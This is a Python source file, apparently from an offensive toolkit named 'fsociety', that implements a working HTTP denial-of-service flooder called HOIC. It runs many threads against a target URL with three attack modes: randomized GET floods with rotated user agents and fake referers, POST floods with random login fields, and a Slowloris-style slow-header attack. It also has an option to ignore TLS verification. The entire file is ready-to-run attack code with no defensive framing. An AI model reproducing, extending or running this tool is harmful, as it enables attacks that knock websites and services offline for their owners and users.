from __future__ import annotations
import http.client
import os
import random
import socket
import ssl
import string
import threading
import time
import urllib.parse
from fsociety.core.base import tool
from fsociety.core.logger import Log

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
]

@tool("hoic", "High Orbit Ion Cannon: HTTP booster flooding", category="dos")
class Hoic:
    @staticmethod
    def build_parser(p):
        p.add_argument("url", help="Target URL")
        p.add_argument("--threads", type=int, default=100, help="Number of threads")
        p.add_argument("--duration", type=int, default=60, help="Duration in seconds")
        p.add_argument("--booster", default="random", choices=["random", "post", "slow"], help="Attack vector")
        p.add_argument("--insecure", action="store_true", help="Ignore TLS verification")

    @staticmethod
    def _random_str(length: int) -> str:
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))

    @staticmethod
    def _get_ctx(insecure: bool):
        ctx = ssl.create_default_context()
        if insecure: ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        return ctx

    @staticmethod
    def _http_worker(url: str, booster: str, insecure: bool, stop_event: threading.Event):
        parsed = urllib.parse.urlparse(url)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port or (443 if scheme == "https" else 80)
        path = parsed.path or "/"
        ctx = Hoic._get_ctx(insecure)

        while not stop_event.is_set():
            try:
                if booster == "slow":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4); s.connect((host, port))
                    if scheme == "https": s = ctx.wrap_socket(s, server_hostname=host)
                    s.send(f"GET /?{Hoic._random_str(4)} HTTP/1.1\r\nHost: {host}\r\n".encode())
                    for _ in range(10):
                        if stop_event.is_set(): break
                        s.send(f"X-a: {Hoic._random_str(8)}\r\n".encode()); time.sleep(2)
                    s.close()
                    continue

                if scheme == "https": conn = http.client.HTTPSConnection(host, port, timeout=5, context=ctx)
                else: conn = http.client.HTTPConnection(host, port, timeout=5)

                headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*", "Connection": "keep-alive"}
                if booster == "random":
                    req_path = f"{path}?{Hoic._random_str(6)}={Hoic._random_str(6)}"
                    headers["Referer"] = f"https://google.com/search?q={Hoic._random_str(4)}"
                    conn.request("GET", req_path, headers=headers)
                elif booster == "post":
                    payload = f"user={Hoic._random_str(5)}&pass={Hoic._random_str(8)}&submit=1"
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    conn.request("POST", path, body=payload, headers=headers)
                else: conn.request("GET", path, headers=headers)

                conn.getresponse().read(256); conn.close()
            except Exception: pass

    @staticmethod
    def run(args, log: Log) -> int:
        log.info(f"Target: {args.url} | Booster: {args.booster.upper()} | Threads: {args.threads} | Duration: {args.duration}s")
        stop_event = threading.Event(); threads = []
        
        log.warn("Firing in 3 seconds..."); time.sleep(3)
        for _ in range(args.threads):
            t = threading.Thread(target=Hoic._http_worker, args=(args.url, args.booster, args.insecure, stop_event), daemon=True)
            t.start(); threads.append(t)

        start_time = time.time()
        try:
            while time.time() - start_time < args.duration: time.sleep(1)
        except KeyboardInterrupt: log.warn("Interrupted by user.")

        stop_event.set()
        for t in threads: t.join(timeout=1.0)
        log.ok("HOIC flood stopped.")
        return 0
